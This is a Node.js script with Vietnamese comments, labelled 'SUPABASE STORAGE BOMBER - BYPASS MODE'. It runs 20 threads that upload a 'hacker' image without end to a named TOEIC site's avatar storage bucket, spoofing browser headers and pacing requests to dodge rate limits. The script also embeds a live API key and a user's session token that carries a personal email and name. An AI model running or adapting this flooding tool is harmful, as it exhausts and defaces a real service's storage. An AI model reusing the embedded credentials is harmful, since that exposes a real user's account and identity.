const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const TARGET_CONFIG = {
    // URL bucket avatars của người dùng
    baseUrl: "https://qfhmnlvgweznzcsoijyr.supabase.co/storage/v1/object/avatars/819d5623-0e42-45bd-82de-4b73c1dbf0ff/",
    viewUrl: "https://qfhmnlvgweznzcsoijyr.supabase.co/storage/v1/object/public/avatars/819d5623-0e42-45bd-82de-4b73c1dbf0ff/",
    // Dán Anon Key và Token mới nhất lấy từ trình duyệt vào đây
    apiKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFmaG1ubHZnd2V6bnpjc29panlyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg4MDYyMzQsImV4cCI6MjA4NDM4MjIzNH0.mNJAoc-uJVilLr03PT3luXsekfwJ4sICOIsOIRQu-N0",
    token: "Bearer eyJhbGciOiJFUzI1NiIsImtpZCI6ImUwNTFjYmQ0LTMzOTgtNGQ0Yy05NDc0LTUzNjIwMTBmN2Q5YiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL3FmaG1ubHZnd2V6bnpjc29panlyLnN1cGFiYXNlLmNvL2F1dGgvdjEiLCJzdWIiOiI4MTlkNTYyMy0wZTQyLTQ1YmQtODJkZS00YjczYzFkYmYwZmYiLCJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzc1OTI4MzIyLCJpYXQiOjE3NzU5MjQ3MjIsImVtYWlsIjoiYnVpZGluaHF1b2MyMDA1QGdtYWlsLmNvbSIsInBob25lIjoiIiwiYXBwX21ldGFkYXRhIjp7InByb3ZpZGVyIjoiZ29vZ2xlIiwicHJvdmlkZXJzIjpbImdvb2dsZSJdfSwidXNlcl9tZXRhZGF0YSI6eyJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSUJucl91TVFqc2tWYjhVTDh4a1d1OW40RW5VejFhWUdPdGthZkJPbEt6am5DMmVFMFI9czk2LWMiLCJlbWFpbCI6ImJ1aWRpbmhxdW9jMjAwNUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiZnVsbF9uYW1lIjoiUXXhu5FjIELDuWkiLCJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYW1lIjoiUXXhu5FjIELDuWkiLCJwaG9uZV92ZXJpZmllZCI6ZmFsc2UsInBpY3R1cmUiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NJQm5yX3VNUWpza1ZiOFVMOHhrV3U5bjRFblV6MWFZR090a2FmQk9sS3pqbkMyZUUwUj1zOTYtYyIsInByb3ZpZGVyX2lkIjoiMTA4ODUyNDY4NzA5OTQ0NjU2MDQwIiwic3ViIjoiMTA4ODUyNDY4NzA5OTQ0NjU2MDQwIn0sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoib2F1dGgiLCJ0aW1lc3RhbXAiOjE3NzU0NjY4NjN9XSwic2Vzc2lvbl9pZCI6IjI1M2IzMzY4LTkzZmItNGY0Ny1hZGJiLTQ4NjRkMzNhYTA4ZCIsImlzX2Fub255bW91cyI6ZmFsc2V9.kR7f1fH-Isw0BOV6No0mynOM6SmJayjMIOb2ohkt0tnMyFF5HbBFXTEvBbYS2uP1IE8sDFhVatvZ_EQI2xoqDg",
    threadCount: 20, // Giảm xuống 8 để ổn định hơn
    localImagePath: "Tớ là hacker nek_text.png"
};

if (isMainThread) {
    if (!fs.existsSync(TARGET_CONFIG.localImagePath)) {
        console.error(`❌ Không tìm thấy file ${TARGET_CONFIG.localImagePath}!`);
        process.exit(1);
    }

    let stats = { count: 0, mb: 0 };
    let startTime = Date.now();
    let logs = new Array(TARGET_CONFIG.threadCount).fill("Initializing...");

    for (let i = 0; i < TARGET_CONFIG.threadCount; i++) {
        const worker = new Worker(__filename, { workerData: i });
        worker.on('message', (msg) => {
            if (msg.type === 'success') {
                stats.count++;
                stats.mb += msg.sizeMB;
            }
            logs[i] = msg.status;
        });
    }

    setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        process.stdout.write('\x1Bc'); // Clear console
        console.log(`================================================================`);
        console.log(`🖼️  SUPABASE STORAGE BOMBER - BYPASS MODE`);
        console.log(`================================================================`);
        console.log(`⏱️  Uptime: ${elapsed.toFixed(0)}s | 🚀 Total: ${stats.mb.toFixed(2)} MB`);
        console.log(`📦 Files Uploaded: ${stats.count} | ⚡ Speed: ${(stats.mb / elapsed).toFixed(2)} MB/s`);
        console.log(`----------------------------------------------------------------`);
        logs.forEach((l, idx) => console.log(` [Thread ${idx}] ${l}`));
        console.log(`----------------------------------------------------------------`);
        const lastSuccess = [...logs].reverse().find(l => l.includes('✅'));
        if (lastSuccess) {
            const fileName = lastSuccess.split('File: ')[1];
            console.log(`👉 Last Link: ${TARGET_CONFIG.viewUrl}${fileName}`);
        }
        console.log(`================================================================`);
    }, 500);

} else {
    const bomb = async () => {
        const imageBuffer = fs.readFileSync(TARGET_CONFIG.localImagePath);
        const sizeMB = imageBuffer.length / (1024 * 1024);
        const ext = path.extname(TARGET_CONFIG.localImagePath).replace('.', '') || 'png';

        while (true) {
            const fileName = `hacker_nek_${Date.now()}_${crypto.randomBytes(2).toString('hex')}.${ext}`;
            const boundary = "----WebKitFormBoundary" + crypto.randomBytes(8).toString('hex');
            
            // Cấu trúc Multipart chuẩn giống hệt Curl
            const header = Buffer.from(
                `--${boundary}\r\n` +
                `Content-Disposition: form-data; name="cacheControl"\r\n\r\n3600\r\n` +
                `--${boundary}\r\n` +
                `Content-Disposition: form-data; name=""; filename="${fileName}"\r\n` +
                `Content-Type: image/${ext === 'jpg' ? 'jpeg' : ext}\r\n\r\n`
            );
            const footer = Buffer.from(`\r\n--${boundary}--\r\n`);
            const body = Buffer.concat([header, imageBuffer, footer]);

            try {
                const response = await fetch(TARGET_CONFIG.baseUrl + fileName, {
                    method: "POST",
                    headers: {
                        "accept": "*/*",
                        "accept-language": "en,vi;q=0.9",
                        "apikey": TARGET_CONFIG.apiKey,
                        "authorization": TARGET_CONFIG.token,
                        "content-type": `multipart/form-data; boundary=${boundary}`,
                        "origin": "https://dautoeic.com",
                        "referer": "https://dautoeic.com/",
                        "sec-ch-ua": '"Chromium";v="146", "Google Chrome";v="146"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
                        "x-client-info": "supabase-js-web/2.90.1",
                        "x-upsert": "true"
                    },
                    body: body
                });

                if (response.status === 200 || response.status === 201) {
                    parentPort.postMessage({ type: 'success', sizeMB, status: `✅ OK - File: ${fileName}` });
                } else {
                    const errorMsg = await response.text();
                    parentPort.postMessage({ type: 'res', status: `❌ Lỗi ${response.status}: ${errorMsg.slice(0, 30)}` });
                    // Nếu lỗi 403 hoặc 401, có thể Token đã hết hạn, dừng vòng lặp để kiểm tra
                    if (response.status === 403 || response.status === 401) break;
                }
            } catch (e) {
                parentPort.postMessage({ type: 'res', status: `💀 Network Error/Timeout` });
            }
            
            // Khoảng nghỉ nhỏ (200ms) để bypass Rate Limiting đơn giản
            await new Promise(r => setTimeout(r, 200));
        }
    };
    bomb();
}